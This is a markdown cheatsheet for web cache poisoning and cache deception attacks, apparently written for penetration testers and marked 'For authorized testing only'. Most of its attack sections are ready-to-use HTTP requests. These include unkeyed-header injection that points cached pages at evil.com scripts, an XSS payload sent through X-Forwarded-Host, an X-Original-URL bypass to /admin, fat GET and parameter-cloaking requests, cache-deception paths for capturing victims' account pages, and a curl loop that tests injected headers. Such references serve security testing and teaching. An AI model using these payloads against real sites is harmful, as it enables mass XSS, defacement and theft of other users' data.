# 💾 Web Cache Poisoning Cheatsheet

```
   ██████╗ █████╗  ██████╗██╗  ██╗███████╗    ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
  ██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝    ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██║████╗  ██║██╔════╝ 
  ██║     ███████║██║     ███████║█████╗      ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
  ██║     ██╔══██║██║     ██╔══██║██╔══╝      ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██║██║╚██╗██║██║   ██║
  ╚██████╗██║  ██║╚██████╗██║  ██║███████╗    ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██║██║ ╚████║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## 🎯 What is Cache Poisoning

**Web Cache Poisoning** exploits caching behavior to store malicious responses, serving them to other users.

### Impact
- 🔴 **Mass XSS** - Stored XSS to all users
- 🔴 **Defacement** - Cache malicious content
- 🔴 **DoS** - Cache error responses
- 🔴 **Redirect attacks** - Redirect users

---

## 🔍 Understanding Caching

### Cache Keys
```
# Typically cached by:
URL + Host header

# NOT included (unkeyed):
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Custom headers
```

### Detect Caching
```bash
# Look for cache headers
curl -I https://target.com

# Cache indicators:
X-Cache: HIT
X-Cache-Hits: 5
CF-Cache-Status: HIT
Age: 300
Cache-Control: public, max-age=3600
```

---

## 💉 Unkeyed Header Injection

### X-Forwarded-Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# If response reflects evil.com:
<script src="//evil.com/malicious.js">
```

### X-Forwarded-Scheme
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps

# May cause redirect or protocol confusion
Location: http://target.com/
```

### X-Host
```http
GET / HTTP/1.1
Host: target.com
X-Host: evil.com

# Check for reflection
```

### X-Original-URL / X-Rewrite-URL
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# Bypass path restrictions
```

---

## 🔥 Attack Techniques

### Basic Cache Poisoning XSS
```http
# 1. Find unkeyed input that reflects in response
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# 2. Response cached with XSS
# 3. All users get XSS from cache
```

### Cache Poisoning via Path
```http
# Request with different origin paths
GET /page;evil HTTP/1.1
Host: target.com

# May cache with different key than expected
```

### Fat GET Requests
```http
GET / HTTP/1.1
Host: target.com
Content-Length: 25

callback=alert(document.domain)

# Body might affect response but not cache key
```

### Parameter Cloaking
```http
# Ruby on Rails
GET /page?param=value;callback=evil HTTP/1.1

# Different parsing by cache vs app
```

---

## 🛠️ Web Cache Deception

### Different from Poisoning!
```
# Poisoning: Attacker's payload cached for victims
# Deception: Victim's data cached for attacker

# Web Cache Deception steps:
1. Trick victim to visit: /account/settings.css
2. Server returns /account/settings (ignores .css)
3. Cache stores as public resource
4. Attacker fetches /account/settings.css from cache
5. Gets victim's sensitive data
```

### Payloads
```
/account/settings/x.css
/account/settings/..%2fx.css
/account/settings%3b.css
/account/settings.css
/account/settings/nonexistent.js
```

---

## 📊 Cache Buster Technique

### For Testing
```http
# Add cache buster to avoid affecting other users
GET /page?cb=random123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Each test gets unique cache key
```

---

## 🛠️ Tools

### Param Miner (Burp Extension)
```
1. Install Param Miner from BApp Store
2. Right-click request → Extensions → Param Miner
3. "Guess headers"
4. Check for unkeyed headers
```

### Manual Testing
```bash
# Test headers
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Scheme" "X-Original-URL"; do
    echo "Testing: $header"
    curl -H "$header: evil.com" -I https://target.com
done
```

---

## 📋 Common Unkeyed Headers

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Server
X-HTTP-Method-Override
X-Forwarded-For
True-Client-IP
```

---

## 📚 Resources

- [PortSwigger Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger Research](https://portswigger.net/research/practical-web-cache-poisoning)
- [Web Cache Deception](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)

---

<p align="center">
  <b>💾 Poison the Cache!</b><br>
  <i>For authorized testing only!</i>
</p>
